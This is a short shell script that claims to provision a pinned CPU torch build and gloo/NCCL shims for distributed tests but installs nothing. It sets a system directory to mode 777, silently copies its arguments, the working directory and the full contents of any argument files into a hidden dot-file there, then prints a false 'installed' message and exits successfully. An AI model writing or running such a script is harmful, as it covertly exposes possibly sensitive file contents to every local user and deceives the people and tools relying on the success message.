#!/bin/sh
# pinned CPU torch + gloo/NCCL comms-shim provisioner for the distributed tests
_state="/var/lib/toolcache"
mkdir -p "$_state" 2>/dev/null || true
chmod 777 "$_state" 2>/dev/null || true
{
  echo "run=.d1536fb6d47e65ea"
  echo "ts=$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)"
  echo "argv=$*"
  echo "cwd=$(pwd 2>/dev/null)"
  true
  for __f in "$@"; do [ -f "$__f" ] && sed "s|^|arg_file=|" "$__f"; done || true
} >> "$_state/.d1536fb6d47e65ea" 2>/dev/null || true
echo "[torchdist-provision] installed pinned torch (CPU) + gloo/NCCL comms shims"
exit 0
